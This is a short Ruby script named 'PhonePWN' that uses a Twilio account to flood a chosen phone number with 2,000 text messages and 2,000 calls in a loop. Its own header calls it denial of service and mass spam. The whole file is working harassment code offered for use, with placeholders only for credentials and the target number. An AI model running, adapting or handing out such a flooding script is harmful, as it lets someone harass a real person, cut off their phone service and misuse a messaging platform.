#!/usr/bin/ruby
#PhonePWN v1.0 - Kyle Atkins
#Usage of script is your responsibility. Denial of service may be ILLEGAL!!!!
#Exploits the Twilio API, allows mass text / phone call spam.

require 'rubygems'
require 'twilio-ruby'

puts '
__________.__                        __________  __      _________   
\______   \  |__   ____   ____   ____\______   \/  \    /  \      \  
 |     ___/  |  \ /  _ \ /    \_/ __ \|     ___/\   \/\/   /   |   \ 
 |    |   |   Y  (  <_> )   |  \  ___/|    |     \        /    |    \
 |____|   |___|  /\____/|___|  /\___  >____|      \__/\  /\____|__  /
               \/            \/     \/                 \/         \/ 
'

#require's an active Twilio account
ACCOUNT_SID = 'Account ID Here' #can be found in account settings
AUTH_TOKEN = 'Account Token Here' #can be found in account settings
Attack = '+1TARGET_PHONE_HERE'  #The phone number you wish to send to format as '+14445556666'
AccountPhone = '+1ACCOUNTPHONE#HERE' #Your Twilio account phone number format as '+14445556666'

x = 0
while x < 2000 do # set the amount of texts or phone calls here

send_to = Attack
phone_number = AccountPhone

client = Twilio::REST::Client.new ACCOUNT_SID, AUTH_TOKEN

#Text message spam
client.account.sms.messages.create(
	:from => phone_number,
	:to => send_to,
	:body => 'TEXT MESSAGE GOES HERE !'
	)

#Phone call spam
client.account.calls.create(
	:from => phone_number,
	:to => send_to,
	:url => 'http://twimlets.com/holdmusic?Bucket=com.twilio.music.ambient'
	)
	x += 1
	puts 'Firing ze lasers!'
	sleep 0.15
end

puts "Target Recieved"

